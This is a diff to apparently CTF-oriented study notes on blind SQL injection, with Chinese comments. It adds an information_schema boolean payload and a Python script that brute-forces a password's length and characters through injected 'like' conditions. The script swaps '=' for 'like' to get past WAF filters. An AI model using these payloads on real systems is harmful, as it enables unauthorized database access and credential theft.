@@ -75,6 +75,8 @@ mid(str,pos,len)
 ascii(str)    // we will get decimal, ord()
 if(a,b,c)   // if a is true, return b, otherwise return c
 id=1' and ascii(substr((select database()),1,1))>65--+
+// 靈活的使用語法
+and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
 ```
 **Time based**  
 ```sql
@@ -89,13 +91,27 @@ from string import digits, ascii_uppercase, ascii_lowercase
 
 target = url
 flag = ''
+label = "<grey>hi:</grey> value1<br/>"                  // label為每一次爆破成功的標誌
 wordlist = digits + ascii_uppercase + ascii_lowercase         // 透過上面引用，可以將數字，字母一次性加入payload
-for i in range( , ):    // range of flag length
-   d = {'key':'value','key2':'substr(flag,{},1)'.format(i)}        // 盲注，有時需要繞過waf
-   response = requests.post(target,data=d)
-   flag += re.search(pattern_reg, specific_txt)
-   print flag
-print '[+] flag: pwnch{{}}'.format(flag)
+for i in range(0,100):                                // 確認flag的長度
+    d = {"key1":"value1","key2":" and length(password) like "+str(i)}       // 注入payload通常會要求繞過waf(等號替換成like之類的)
+    response = requests.post(target,data=d)
+    if label in response.text:
+        print "Get length of flag is : " + str(i)
+        flag_leng = i
+        break
+    print d
+for i in range(1, flag_leng+1):                      // mid, substring等index都從1開始
+    for j in range(40,127):                  // dec(ascii) (,),*,+,..0,1,...A,B,....a,b,c,.....{,|,},~,DEL
+        d = {"key1":"value1","key2":" and mid(password," + str(i) + ",1) like '" + chr(j) + "'"}
+                                                       // chr(97) -> 'a' 
+        response = requests.post(target,data=d)
+        if label in response.text:
+           flag += chr(j)
+           print flag
+           break
+        print d
+print flag
 ```
 
 ### Error based
